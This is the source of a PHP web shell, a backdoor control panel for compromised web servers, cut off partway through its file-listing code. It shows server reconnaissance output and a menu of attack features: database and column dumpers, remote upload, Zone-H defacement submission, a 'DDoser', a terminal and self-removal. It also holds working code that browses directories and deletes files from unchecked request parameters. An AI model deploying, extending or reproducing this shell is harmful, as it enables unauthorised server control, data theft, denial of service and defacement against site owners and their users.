<?php 


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">





<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">

  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
    <style>

        body{
            margin: 0;
            padding: 0;
        }
        .back{
            width: 100%;
            min-height: 900px;
            background-image: url(b1.jpg);
            background-position: center;
            background-size: cover;
            background-attachment: fixed;
        }

        .box-roo{
            width: 100%;
            min-height: 150px;
            margin: 0 auto;
            top: 10px;
            position: relative;
            max-width: 1480px;
            background-color:#1d1d1dc9;/*1d1d1dc9  302f2fa3 131111 [  , 000000cb , 747474a1 , 9d9d9dce ,  1f0606ce, 0a0646bb  , 28333dee , 1d1d1dc9   ]*/
            box-shadow: 2px 2px 10px -3px rgba(38, 38, 38, 0.453);
            border-radius: 3px;

        }

       


        /**************************/
        
    
        .meno{
            width:99%;
            margin: 0 auto;
            position: relative;
            min-height: 230px;
            border-bottom: 2px solid #eee;
            border-radius: 1px;
            padding-top: 10px;
        }

        .p-uname1{
            position: relative;
            left: 10px;
            margin:0px;
            font-weight: 600;
            font-size: 15px;
            font-family: Verdana, Geneva, Tahoma, sans-serif;
        }
        
        .span-g{
            left: 9px;
            position: relative;
        }
        

    /*************************/

    /*********************/

    .meno-options{
        width: 100%;
        min-height: 70px;
        border-bottom: 2px solid #fff;
    }

    .input-option{
        padding-top: 4px;
        padding-bottom: 4px;
        padding-right: 10px;
        padding-left: 10px;
        background-color: black;
        color: brown;
        border-radius: 4px;
        border: 2px solid brown;
        position: relative;
        transition: all 0.5s;
        top:2px;
        display: inline-block;
        margin:5px;
/*         margin-top:3000px;
 */
    }
    .input-option:hover{
        border:2px solid #ffc107;
        color: #ffc107;
    }

    .form-option{
        display: inline-block;

    }
  /*   .meno-2-option{
        width: 77%;
        min-height: 70px;
        margin: 0 auto;
        border: 2px solid #fff;

    } */
    /***********************/

    /***********************/

/*     .list{
        width: 100%;
        min-height: 230px;
        border-top: 2px solid #ffffff;
        border-bottom: 2px solid #ffffff;

    
    } */
    .location-shell{
        width: 100%;
        min-height: 60px;
/*         border: 2px solid red;
 */        background-color:#0000009e ;
    }

    .mtn-pwd{
        position: relative;
        left: 50px;
        top: 17px;
    }

    /***********************/

    .table-content td{
        height: 39px;
        background-color: #2e2e2ec2;
        border-left: 1px solid #1a1a1aea;
        color: #fff;
        border-right: 1px solid #1a1a1aea;
    }
     .table-content tr:hover{
        background-color: #5a5a5ae5;
    } 
    .td-id-content{
        width: 3%;
    
    }
    .td-name-content{
        width: 30%;
       padding-left: 13px;
       font-size:16px;
       font-weight: 900;
       color:#FFF;
       position:relative;
/*        bottom:5px;
 */       font-family: Verdana, Geneva, Tahoma, sans-serif;
       
       
    }
    
    

    .td-size-content{
        width: 10%;
        text-align: center;

    }

    .td-type-content{
        width: 10%;
        text-align: center;
    }

    .td-permission-content{
        width: 10%;
        text-align: center;

    }
    .td-update-content{
        width: 13%;
        text-align: center;

    }
    .td-option-content{
        width: 20%;

    }
    .check-content{
            height: 30px;
            width: 20px;
            background-color: #eee;
            position: relative;
            top: 2px;
            left: 17px;
    }

    tr{
        margin-top: 10px;
    }
 
    .table-content{
        width: 100%;
/*         background-color: rgba(26, 26, 26, 0.905);
 */        height: 50px;
    }
    .table-content th{
        color: #fff;
        height: 50px;
    }
    .id-content{
        width: 3%;
        text-align: center;
        position: relative;
     /*    border-left: 2px solid #000;
        border-right: 2px solid #000; */

    }
    .text-sort{
/*         padding:4px;
 *//*         border:3px solid #ffc107;
/*  */        border-radius: 100%;
 */        text-align: center;
        position: relative;
        left:9px;
    }

    

    .type-content{
        width: 10%;
        position: relative;
        text-align: center;
    }

    .name-content{
        width: 30%;
        position: relative;
        text-align: center;
    }
    .size-content{
        width: 10%;
       text-align: center;

    }
    .permission-content{
        width: 10%;
        text-align: center;
    }
    .update-content{
        width: 13%;
        text-align: center;
    }
    .option-content{
        width: 20%;
        text-align: center;
    }


    .mtn-persian{
            color: #ffc107;
            position:relative;
            top:15px;
            font-weight: bolder;
            font-family: Arial, Helvetica, sans-serif;
            letter-spacing: 20px;
            }

            .box-persian{
            width: 100%;
            height: 70px;
            margin:0 auto;
            position:relative;/*absolute */
/*             border:3px solid red;
 */            background-color:#0000009e;
                margin-top:25px;
            }

            .footer-shell{
        width: 99%;
        min-height: 430px;
        background-color: #302f2fa3;
        margin: 0 auto;
        margin-top: 20px;
        position: relative;
/*         border:2px solid blue;
 */    }


 .dakhel-footer{
        width: 100%;
        max-width: 1180px;
        margin: 0 auto;
        min-height: 200px;
/*         border: 2px solid red;
 */    }
    .form-foot{
        display: inline-block;
    }

    .btn-foot{
         background-color: #1f1e1ec6;
         border-radius: 5px;
         border: 2.2px solid #ffc107;
         padding-left:20px ;
         padding-right: 20px;
         padding-bottom: 2px;
         padding-top: 2px;
         color: #fff;
         transition: all 0.5s;
     }
     .btn-foot:hover{
        background-color: #ffc107;
        color: #111111;
     }

     .div-uploader{
        position: relative;
        width: 100%;
        max-width: 500px;
        min-height: 70px;
/*         border: 2px solid red;
 */        margin:0 auto;
/*         top: 10px;
 */    }
    .input-file{
        border: 2px solid#ffc107;
        border-radius: 3px;
        color: #f7f7f7;
        margin: 30px;
    }


.input-rename{
    width: 100%;
        max-width:290px;
        height: 35px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 6px;
        color: #f7f7f7;
        padding-left: 10px;
        font-size: 16px;
        margin-left:10px;
        margin-right:10px;
        margin-bottom:13px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 10px;
        outline: none;
        background-color: #1f1e1ec6;
}

    .input-footer{
        width: 100%;
        max-width: 200px;
        height: 31px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin: 35px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 20px;
        outline: none;
/*         box-shadow: 2px 1px 13px -3px #f7ad0e;
 */
        background-color: #1f1e1ec6;
     }


        /***********************/



        .mtn-name{
    color: grey !important;
    position: relative;
    font-size: 25px;
    font-weight: 800;
    font-family: Verdana, Geneva, Tahoma, sans-serif; 
}


.div-bootom{
  width: 455px;
  height: 43px;
  border-bottom: 3px solid #a7a6a6;
  margin:  0 auto;
  top: 10px;
position: relative;
}


.mtn-zir{
top: 30px;
position: relative;
font-size: 20px;
}

.img-tel{
    width: 35px;
    height: 35px;
    border-radius: 100px;
}

/**********************/

.option-file{
    padding-left: 13px;
    padding-right: 13px;
    padding-top: 4px;
    padding-bottom: 4px;
    border-radius: 5px;
    margin-left: 2px;
    margin-right:2px;
    color: #ffc107 !important;
    background-color: #1f1e1ec6 !important;
    border:1px solid #1f1e1ec6 ;
}
.option-file:hover{
    border: 1px solid #ffc107;
}
.form-option-file{
    display: inline-block;
}
*{
    text-decoration: none !important;
}
a{
    text-decoration: none !important;
}

/****************************** */
   
   .div-db-dumper{
    width:100%;
    min-height: 300px;
/*     border:2px solid blue;
 */   }
   .div-dakhel-db-dumper{
    width:100%;
    margin:0 auto;
    position:relative;
    top:30px;
    max-width:900px;
    min-height: 120px;
/*     border:2px solid red;
 */   }

 .div-dakhel-col-dump{
    width:100%;
    margin:0 auto;
    position:relative;
    top:30px;
    max-width:1120px;
/*     border:2px solid red;
 */    min-height: 120px;

  }

    .div-res-dumper{
    width:100%;
    min-height: 500px;
    max-width:900px;
/*     border:2px solid white;
 */    margin:60px auto;
    }

.div-desig-db{
    width:100%;
    min-height: 400px;
/*     border:2px solid pink;
 */    margin:40px 0px 0px 0px;
}
.mtn-res-name-db{
    padding-top:10px;
    padding-bottom:10px;
    padding-left:17px;
    padding-right:17px;
    width:150px;
    height:40px;
/*     border:2px solid red;
 */}

.text-bold-m{
    font-weight:300;
}










 .div-col-dumper{
    width:100%;
    min-height: 500px;
/*     border:2px solid red;
 */ }

 .div-res-col-dump{
    width:100%;
    min-height: 200px;
    max-width:880px;
    margin:0 auto;
    top:20px;
    margin:60px 0px 0px 0px;
/*     border:2px solid red;
 */ }
   
.p-banner{
    position: relative;
    text-align:left;
    left:15px;
    top:5px;
}

.p-res-col-dump{
    color:#eee;
    text-align:left;
/*     position:relative;
 */    margin-top:40px;
    margin-left:15px;
    padding-bottom:30px;
}

   .input-dump{
        width: 100%;
        max-width: 200px;
        height: 34px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin: 10px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 20px;
        outline: none;
/*         box-shadow: 2px 1px 13px -3px #f7ad0e;
 */
        background-color: #1f1e1ec6;
   }
   .bt-dump{
    position:relative;
    top:10px;
   }
   /************************/
   
   .div-ddoser{
    width:100%;
    min-height: 300px;
/*     border:2px solid red;
 */   }

 .div-agent{
    width:100%;
    min-height: 200px;
 }

   .div-dakhel-ddoser{
    width:100%;
    margin:0 auto;
    position:relative;
    top:30px;
    max-width:690px;
    min-height: 120px;
/*     border:2px solid red;
 */   }
   .bt-ddoser{
    position:relative;
    top:10px;
   }

   .div-about{
    width:100%;
    min-height: 310px;
/*     border:2px solid red;
 */   }

   .div-dakhel-about{
       width:100%;
       max-width:350px;
       min-height:120px;
/*        border:3px solid blue;
 */       margin:0 auto;
       position:relative;
       top:20px;
   }
   .img-about1{
       width:90px;
       height:90px;
       border-radius: 100px;
       display: inline-block;
       border:2px dashed #eee;

   }

   .img-about2{
       width:110px;
       height:110px;
       border-radius: 100px;
       display: inline-block;
       margin-left:20px;
       border:2px dashed red;


   }

   .img-about3{
       width:90px;
       height:90px;
       border-radius: 100px;
       display: inline-block;
       margin-left:20px;
       border:2px dashed #eee;


   }

   .div-about-bot{
    width: 255px;
  height: 43px;
  border-bottom: 3px solid #a7a6a6;
  margin:  0 auto;
  top: 30px;
position: relative;
   }

   .text-about-2{
       color:#eee;
       top: 50px;
position: relative;
   }

   .div-icon-about{
    width:100%;
       max-width:80px;
       min-height:30px;
/*        border:3px solid blue;
 */       margin:0 auto;
       /* position:relative;
       top:60px; */
       margin-top:60px;
       padding-bottom:20px;
   }


   .img-about-ic{
       width:26px;
       height:26px;
       border-radius: 100px;
       display: inline-block;
       margin-left:10px;
       border:2px solid #fff;

/*        border:2px dashed #eee;
 */   }

 .img-about-ic2{
       width:28px;
       height:28px;
       border-radius: 100px;
       display: inline-block;
       margin-left:10px;
       border:2px solid #fff;
/*        border:2px dashed #eee;
 */   }
 /*////////////////////////////////////////*/

 .show-sorce{
       width:100%;
       max-width:900px;
       margin:0 auto;
       min-height:100px;
       border-radius: 5px;
       border:3px solid #fff;

 }

 .text-lable{
     color:#fff;
 }

 .div-dakhel-edit{
       width:100%;
       max-width:530px;
       margin:0 auto;
       min-height:460px;
       border-radius: 5px;
       position:relative;
       top:30px;
/*        border:3px solid blue;
 */ }

 .div-edit{
       width:100%;
       margin:0 auto;
       min-height:600px;
/*        border:3px solid red;
 */ }

 .textarea-1{
     outline:none;
     border-radius: 8px;
     padding:5px;
     border:2px solid #ffc107;
/*      background-color:#000;
 */     color:#fff;

 }
 /******************************* */
 .div-whois{
    width:100%;
    margin:0 auto;
    min-height:300px;
/*     border:3px solid red;
 */
 }
 .div-dakhel-whois{
    width:100%;
    max-width:460px;
    margin:0 auto;
    position:relative;
    top:15px;
    min-height:60px;
/*     border:3px solid white;
 */
 }
 .input-whois{
    width: 100%;
        max-width: 270px;
        height: 34px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin: 35px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 20px;
        outline: none;
        background-color: #1f1e1ec6;
 }
/**************************** */

.result-find-hash{
        width: 100%;
        max-width: 450px;
        height: 40px;
        border:2px solid #9999;
        background-color:#eee;
        box-shadow:2px 2px 10px -2px #9999;
        margin:0 auto;
        position:relative;
        top:30px;
        border-radius: 7px;

}
.mtn-resilt-hash{
    position:relative;
    top:8px;
    left:5px;
}

/*///******* / *******************/

i{
    font-size:23px;
  position:relative;
  margin-right:8px;
  top:1px;
}

a{
        text-decoration: none;
        color: #fff;
        position:relative;
        bottom:3px;
    }
    a:hover{
        color: #fff;


    }


.img-title-modal{
        width: 50px;
        height: 50px;
        border:2px dashed #eee;
        display: inline-block;
        position:relative;
        top:8px;

        
        }

.img-title-modal2{
        width: 60px;
        height: 60px;
        border:2px dashed #eee;
        display: inline-block;
        position:relative;
        top:5px;
}

.div-modal-title{
        width: 43%;
        height: 76px;
        margin:0 auto;
        top:5px;
        position:relative;
        border-bottom:2px solid #fff;
        display: inline-block;
}
/******************************* */
.div-remote-up{
        width: 100%;
        min-height:200px;
}

.div-dakhel-remote{
        width: 100%;
        max-width:400px;
/*         border:2px solid red;
 */        margin:0 auto;
        position:relative;
        top:30px;
        min-height:50px;
}
.input-remote{
        width: 100%;
        max-width: 260px;
        height: 34px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin: 10px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 20px;
        outline: none;
        background-color: #1f1e1ec6;

}

/* .input-key{
    width: 100%;
        max-width: 370px;
        height: 34px;
        border: 2px solid #ffc107; /*ffc107  f4eeee *
        padding: 5px;
        color: #f7f7f7;
        margin: 10px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 20px;
        outline: none;
        background-color: #1f1e1ec6;

} */

/****************************** */
    .table_seting{
        width: 100%;

    }

    .table_seting th{
        height: 59px;
        background-color: #2e2e2ec2;
        border-left: 1px solid #1a1a1aea;
        color: #fff;
        border-right: 1px solid #1a1a1aea;
    }

    .ch_bg_shell{
        height:17px;
        width:17px;
        position:relative;
        top:3px;
        margin-left:12px;
/*         display: inline-block;
 */        
    }

    .img_bg_shell{
        height:50px;
        width:50px;
        border-radius: 100px;
        position:relative;
        margin-left:24px;

    }





    .table-seting-header{
        width: 100%;

    }
    .table-seting-header th{
        height: 42px;
        background-color: #2e2e2ec2;
        border-left: 1px solid #1a1a1aea;
        color: #fff;
        border-right: 1px solid #1a1a1aea;
    }

    .col-h{
        height:50px;
        width:50px;
        border-radius: 100px;
        position:relative;
        margin-left:24px;
        border:1px solid #fff;
        display: inline-block;


    }




    .table-seting-content{
        width: 100%;
    }
    .table-seting-content th{
        height: 42px;
        background-color: #2e2e2ec2;
        border-left: 1px solid #1a1a1aea;
        color: #fff;
        border-right: 1px solid #1a1a1aea;
    }

    /***************************** */

    .rs-whois{
        width: 100%;
        max-width: 600px;
        min-height:150px;
        border:2px solid #fff;
        margin:0 auto;
        background-color:#1a1a1aea;
        position:relative;
        top:20px;
        border-radius: 7px;

    }

    .mtn-res-whois{
        position: relative;
        top:7px;
        left:5px;
    }

    .btn-col3{
        margin:2px;

    }

    /************************ */

    .div-zoneh{
        width: 100%;
        min-height:230px;
    }

 .div-dakhel-zoneh{
        width: 100%;
        min-height:500px;
        max-width:430px;
/*         border:3px solid red;
 */        margin:0 auto;
    }
    
    .div-zone-to{
        width: 100%;
        min-height:50px;
/*         border:2px solid red;
 */        margin-left:10px;
        position: relative;
        top:10px;
     margin-right:10px;

    }

.zoneh-resault{
        width: 100%;
        max-width: 300px;
        min-height: 100px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin-bottom: 5px;
        margin-top:5px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 4px;
        outline: none;
        margin:0 auto;
/*         box-shadow: 2px 1px 13px -3px #f7ad0e;
 */
        background-color: #1f1e1ec6;
}
    .zoneh-top{
        width: 100%;
        min-height:10px;
        max-width:430px;
       margin:50px 0px 0px 0px; 
    }

    .input-zoneh{
        width: 100%;
        max-width: 300px;
        height: 31px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 5px;
        color: #f7f7f7;
        margin-bottom: 5px;
        margin-top:5px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 4px;
        outline: none;
/*         box-shadow: 2px 1px 13px -3px #f7ad0e;
 */
        background-color: #1f1e1ec6;
    }

    .input-ddoser-2{

    }

    .input-ddoser{
        width: 100%;
        height: 31px;
        border: 2px solid #ffc107; /*ffc107  f4eeee */
        padding: 4px;
        color: #f7f7f7;
        position: relative;
        bottom:8px;
        padding-left: 10px;
        font-size: 15px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 8px;
        outline: none;
/*         box-shadow: 2px 1px 13px -3px #f7ad0e;
 */
        background-color: #1f1e1ec6;
    }


    /**************************** */

.div-encoder{
    width: 100%;
    min-height:230px;
/*     border:3px solid red;
 */}

.div-encoder{
    width: 100%;
    min-height:430px;
/*     border:3px solid red;
 */    max-width:800px;
    margin:0 auto;
}

.mtn-encode{
    display:inline-block;
    font-weight:900;
    margin-left:10px;
}

.div-terminal{
    width: 100%;
   
/*     border:3px solid white;
 */}

.textarea-2{
    outline:none;
     border-radius: 8px;
     padding:5px;
     border:2px solid #1f1e1ec6;
     color:#fff;
     
}

.input-terminal{
        width: 100%;
        max-width: 400px;
        height: 35px;
        border: 2px solid green; /*ffc107  f4eeee */
        padding: 6px;
        color: #f7f7f7;
        margin-top:20px;
        margin-bottom:20px;
        margin-left:15px;
        padding-left: 10px;
        font-size: 16px;
        font-family: Verdana, Geneva, Tahoma, sans-serif;
        border-radius: 5px;
        outline: none;
        background-color: #1f1e1ec6;
}

.btn-terminal{
    padding-left: 10px;
    padding-top: 5px;
    background-color: #1f1e1ec6;
    border: 2px solid green; /*ffc107  f4eeee */
    padding-right: 10px;
    padding-bottom: 5px;
    color:green;
    font-size:15px;
    font-weight:bold;
    border-radius: 5px;
    outline: none;
    margin-left:7px;

}

.div-dakhel-terminal{
    min-height:550px;
    width: 100%;
    max-width: 500px;
    margin:0 auto;
/*     border:3px solid blue;
 */
}
    </style>

<script src='https://code.jquery.com/jquery-3.6.0.min.js'></script>

</head>
<?php  error_reporting(0);  ?>
<?php 

function secure_filter($input) {
    
    $step1 = strip_tags($input);
    
    $step2 = stripcslashes($step1);
    
    $step3 = stripslashes($step2);
    
    $step4 = htmlentities($step3);
    
    $step5 = htmlspecialchars($step4);
    
    return $step5;
}
?>
<div class="back">
    <div class="box-roo">
        <div class="meno">

            <p class="p-uname1 text-left text-capitalize text-warning">uname : <span class="text-primary p-uname-span"><?php echo php_uname(); ?></span> </p>
            <p class="p-uname1 text-left text-capitalize text-warning">Software : <span class="text-primary"> <?php echo getenv("SERVER_SOFTWARE"); ?></span></p>
            <p class="p-uname1 text-left text-capitalize text-warning">user : <span class="text-primary"><?php echo get_current_user(); ?></span> <span class="p-uname1 text-left text-capitalize text-warning">Group : </span> <span class="text-primary span-g"> <?php echo getmyuid (); ?> </span>  </p>
            <p class="p-uname1 text-left text-capitalize text-warning">Your Ip Address is : <span class="text-primary"><?php echo $_SERVER['REMOTE_ADDR']; ?> </span> <span class="p-uname1 text-left text-capitalize text-warning">Server Ip Address is : </span> <span class="text-primary span-g"> 127.0.0.1 </span></p>
            <p class="p-uname1 text-left text-capitalize text-warning">HDD : <span class="text-primary text-capitalize">free:440.14 GB Total: 996 GB</span> </p>
            <p class="p-uname1 text-left text-capitalize text-warning">PHP Version : <span class="text-primary text-capitalize"></span><span class="text-primary span-g"> <?php echo phpversion(); ?></span></p>
            <p class="p-uname1 text-left text-capitalize text-warning">Now Domain : <span class="text-primary text-capitalize">localhost</span> </p>
    <!--    <p class="p-uname7 text-left text-capitalize text-warning">Memory Usage : <span class="text-primary text-capitalize"><?php echo "8mb"?></span> </p>-->  
            <p class="p-uname1 text-left text-capitalize text-warning">Date/Time : <span class="text-primary text-capitalize">  <?php echo date('Y-m-d H:i:s'); ?></span> </p>
            <p class="p-uname1 text-left text-capitalize text-warning">Disbale Functions : <span class="text-danger text-capitalize"> CURL : <?php if(extension_loaded('curl')){echo "<span class='text-success'>[ON]</span>";} else{echo "<span class='text-muted'>[OFF]</span>";}?> | Safe Mode : <?php $safe_mode_1=ini_get("safe_mode"); if($safe_mode_1 == 'TRUE'){echo "<span class='text-success'>[ON]</span>";} else{ echo "<span class='text-muted'>[OFF]</span>";}?> |</span> </p>


        </div>

        <div class="meno-options">
            <div class="meno-2-option">
            
            <form method="POST" enctype="multipart/form-data" action="" class="form-option">

                <a href='?pwd=<?php echo getcwd().'/'; ?>' class="input-option" >Files</a>
                <a href='?dumper=dumper&edit_pwd=<?php echo getcwd(); ?>' class="input-option">DB Dumper </a>
                <a href='?coldump=coldump&edit_pwd=<?php echo getcwd(); ?>' class="input-option">Column Dumper</a>
                <a href='?encoder=encoder&edit_pwd=<?php echo getcwd(); ?>' class="input-option"> Encoder</a>
                <a href='?decoder=decoder&edit_pwd=<?php echo getcwd(); ?>' class="input-option"> Decoder</a>

<!--                 <a href='' class="input-option">Symlink</a>
 -->                <a href='?whois=whois&edit_pwd=<?php echo getcwd(); ?>' class="input-option">Whois</a>
                <a href='?remote=remote&edit_pwd=<?php echo getcwd(); ?>' class="input-option">Remote Upload</a>
                <a href='?zoneh=zoneh' class="input-option">Zone -h</a>
<!--                 <a href='' class="input-option">Brute Forcer</a>
 -->                <a href='?ddoser=ddoser&edit_pwd=<?php echo getcwd(); ?>'class="input-option">DDoser</a>
                <a href='?agent=agent&edit_pwd=<?php echo getcwd(); ?>' class="input-option">Generate User-agent  </a>

                <a href='?hash_finder=hash_finder&pwdw=<?php echo getcwd(); ?>'class="input-option">Hash Finder</a>
                <botton type="button" data-bs-toggle="modal" data-bs-target="#exampleModal" class='input-option'>More Information</botton>
                <botton type="button" data-bs-toggle="modal" data-bs-target="#exampleModal2" class='input-option'>Seting</botton>
                <a href='?terminal=terminal&edit_pwd=<?php echo getcwd(); ?>'class="input-option">Terminal</a>

                <a href='?about=about&edit_pwd=<?php echo getcwd(); ?>'class="input-option">About Us</a>
                <?php
                $dirname = dirname(__FILE__);
                $file = $_SERVER['PHP_SELF'];
                $exploded = explode("/",$file);
                $shellname =  end($exploded);
                $shellpath = $dirname."/".$shellname;
                ?>
                <a href='?removeshell=<?php echo $shellpath; ?>' class="input-option">Remove Shell</a>
                <?php
                if(isset($_GET['removeshell'])){
                    $remove = $_GET['removeshell'];
                    unlink($remove);
                    echo "<script>alert(' [~] shell removed successfuly :) see you! [~] ');</script>";
                }


                ?>

            </div>
        </div>
        <div class="location-shell">
      
             <h2 class="text-primary h6 text-left mtn-pwd" ><span class="text-warning">PWD :</span>
             
             <?php if(isset($_GET['pwd'])){
                 $home=getcwd().'/';
                 $pw1=$_GET['pwd'];
                 $ex_m=explode("/",$pw1);
                    foreach ($ex_m as $f => $ex_m_x) {
                        echo "<a class='text-white' style='position:relative;top:0px;' href='?pwd=";
                        for ($il = 0; $il <= $f; $il++) {
                            echo $ex_m[$il];
                            if ($il != $f) {
                                echo "/";
                            }
                        }
                        str_replace('/','',$ex_m_x);
                        echo "/'> $ex_m_x </a>"."<span class='text-warning'>/</span>";

                    }
                    echo "<a href='?pwd=$home' class='text-danger' style='position:relative;top:0px;'>[ Home Shell ]</a>";

                 }
/*                  echo $pw1."<span class='text-danger'>[ Home Shell ]</span>";
 */            
            elseif(isset($_GET['edit_pwd'])){
                $home=getcwd().'/';
                $pw2=$_GET['edit_pwd'];
                $ex_m=explode("/",$pw2);
                    foreach ($ex_m as $f => $ex_m_x) {
                        echo "<a class='text-white' style='position:relative;top:0px;' href='?pwd=";
                        for ($il = 0; $il <= $f; $il++) {
                            echo $ex_m[$il];
                            if ($il != $f) {
                                echo "/";
                            }
                        }
                        str_replace('/','',$ex_m_x);
                        echo "/'> $ex_m_x </a>"."<span class='text-warning'>/</span>";

                    }
                    echo "<a href='?pwd=$home' class='text-danger' style='position:relative;top:0px;'>[ Home Shell ]</a>";

                 }
                
/*                 echo $pw2."<span class='text-danger'>[ Home Shell ]</span>";
 */            
            else{
                echo "";
            
            }
                      
            ?>
            </h2>
    
            </div>

    <div class="list"> 
            

         <!-- **************** Show Files ******************* -->
            <?php

        static $path = "";
        $seperatedpath = array();
        function chaingedir(){
        global $path;
        $path = $_GET['pwd'];
        global $seperatedpath;
        $seperatedpath = explode("/",$path);
        $remove_part = end($seperatedpath);
        if($remove_part == ""){
            $remove_part = $seperatedpath[count($seperatedpath) -2];
            $remove_part = $remove_part."/";
        }
    $path = str_replace($remove_part,"",$path);

        }

        static $nowpath = "";
        function get_path(){
            global $nowpath;
            $nowpath = $_GET['pwd'];
            #$path = $realpath.'/';
        }
                if(isset($_GET['pwd'])){
                 
           echo "<table class='table-content'>
                <th class='id-content'>Row</th>
                <th class='name-content'>Name</th>
                <th class='type-content'>Type</th>
                <th class='size-content'>Size</th>
                <th class='permission-content'>Permissions</th>
                <th class='update-content'>Last Update</th>
                <th class='option-content'>Options</th>
    
               ";?>
               
               
               <?php
               
               function get_perms($file) {
                if($mode=@fileperms($file)){
                    $perms='';$perms .= ($mode & 00400) ? 'r' : '-';$perms .= ($mode & 00200) ? 'w' : '-';$perms .= ($mode & 00100) ? 'x' : '-';$perms .= ($mode & 00040) ? 'r' : '-';$perms .= ($mode & 00020) ? 'w' : '-';$perms .= ($mode & 00010) ? 'x' : '-';$perms .= ($mode & 00004) ? 'r' : '-';$perms .= ($mode & 00002) ? 'w' : '-';$perms .= ($mode & 00001) ? 'x' : '-';
                    return $perms;
                }
                else{
                     return "??????????";
                }
            }

                $count_file_php=0;
                $count_file_html=0;
                $count_files=$sort;
                $count_directory=0;
                $count_file_css=0;
                $count_image=0;
                $time_date=date('Y / m / d [ H:i ]');
                
                $vrodi1 = array_diff(scandir($_GET['pwd']),array("."));
                
               
/* /*                 var_dump($vrodi1);
 *               echo $vrodi1['1'];
                exit; */
                    $sort=1;
                foreach($vrodi1 as $vrodi){
                    

                    if(is_dir($nowpath.$vrodi)){
                        $type="Directory";
/*                         echo $type;
 */                       }
                       else{
                           $ex_p=explode(".",$vrodi);
                           $end_f=end($ex_p);
                           $type=strtolower($end_f);
/*                            echo $type;
 */                       }
               
                

                    get_path();
                    $file_size=round(filesize($nowpath.$vrodi) / 1024,2) ."Kb";
                    
                    /* ********************** */
/*                     $coc="?pwd=".$nowpath.$vrodi.'/';
 *//*                     <td class='td-name-content'><?php if($vrodi==".."){echo "<a href='$coc'>$vrodi</a>";}else{echo "<a href='?edit=$vrodi'>$vrodi</a>";} ?></td>
 */
               ?>

               <?php $masir=htmlentities($_GET['edit_pwd']); ?>
            
                    <tr>
                    <td class='td-id-content'><?php echo "<span class='h6 text-sort'>$sort</span>"; ?></td>
                    <td class='td-name-content'><?php 
                    switch ($type) {
                        case 'php':
                            echo "<i class='fab fa-php'></i>";
                            break;
                    
                        case 'html':
                            echo "<i class='fab fa-html5'></i>";
                            break;

                        case 'css':
                            echo "<i class='fab fa-css3-alt'></i>";
                            break;

                        case 'pdf':
                            echo "<i class='fas fa-file-pdf'></i>";
                            break;

                        case 'zip':
                             echo "<i class='fas fa-file-archive'></i>";
                            break;

                        case 'rar':
                            echo "<i class='fas fa-file-archive'></i>";
                            break;

                        case 'Directory':
                            echo "<i class='fas fa-folder-open'></i>";
                            break;

                        case 'jpg':
                            echo '<i class="far fa-file-image"></i>';
                            break;

                        case 'jpeg':
                            echo '<i class="far fa-file-image"></i>';                            
                            break;

                        case 'jar':
                            echo "<i class='fab fa-java'></i>";
                            break;

                        case 'deb':
                            echo "<i class='fab fa-linux'></i>";
                            break;
                            
                        case 'py':
                            echo "<i class='fab fa-python'></i>";
                            break;
                    
                        case 'js':
                            echo "<i class='fab fa-js-square'></i>";
                            break;

                        case 'csv':
                            echo "<i class='fas fa-file-csv'></i>";
                            break;

                        case 'cs':
                             echo "icon cs";
                            break;

                        case 'pl':
                            echo "icon pl";
                            break;
    
                        case 'cpp':
                            echo "icon cpp";
                            break;

                        case 'sass':
                            echo "<i class='fas fa-sass'></i>";
                            break;

                        case 'jquery':
                            echo "<i class='fab fa-js-square'></i>";;
                            break;

                        case 'mp4':
                            echo "<i class='fas fa-file-video'></i>";
                            break;

                        case 'mp3':
                            echo "<i class='far fa-file-audio'></i>";
                            break;                            
    
                            case 'ogg':
                                echo "<i class='far fa-file-audio'></i>";
                               break;
   
                           case 'sql':
                               echo "<i class='fas fa-database'></i>";
                               break;
   
   
                           case 'txt':
                               echo "<i class='far fa-file-alt'></i>";
                               break;
   
                           case 'srt':
                            echo "<i class='far fa-file-alt'></i>";
                               break;
   
                           case 'ttf':
                            echo "<i class='far fa-file-alt'></i>";
                               break;
   
                           case '7z':
                            echo "<i class='fas fa-file-archive'></i>";
                               break;
                               
                           case 'tar':
